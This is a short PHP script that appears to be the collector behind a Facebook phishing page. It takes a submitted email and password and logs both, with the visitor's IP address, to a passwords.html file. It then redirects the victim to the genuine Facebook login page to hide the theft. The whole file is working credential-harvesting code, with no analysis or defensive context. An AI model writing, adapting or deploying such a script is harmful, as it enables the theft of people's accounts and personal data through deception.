<?php

$email = $_POST['email']; 
$pass = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR']; 
$f = fopen("passwords.html", "a"); 
fwrite ($f, 'Email: [<b><font color="#EE0707">'.$email.'</font></b>] Password: [<b><font color="#390FF1">'.$pass.'</font></b>] IP: [<b><font color="#4EE811">'.$ip.'</font></b>]<br>');
fclose($f);
sleep(3);
header("Location: https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110");
?>
